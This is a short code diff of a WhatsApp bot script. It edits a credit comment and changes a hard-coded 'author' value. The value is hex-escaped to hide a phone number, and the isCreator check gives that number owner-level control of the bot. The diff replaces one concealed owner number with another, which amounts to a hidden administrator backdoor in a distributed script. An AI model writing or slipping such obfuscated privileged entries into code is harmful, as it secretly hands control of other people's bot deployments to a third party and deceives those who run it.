@@ -1,7 +1,7 @@
 /*
 
 › Create By King Sam
-› Button by Tairo Makino
+› Collaborator Tairo Makino
 
                  
 */
@@ -201,7 +201,7 @@ const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
 const botNumber = await zetsubo.decodeJid(zetsubo.user.id)
-const author = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
+const author = `\x32\x33\x34\x38\x31\x36\x34\x37\x34\x37\x35\x33\x34`
 const isCreator = [author, botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await zetsubo.groupMetadata(from).catch(e => {}) : ''
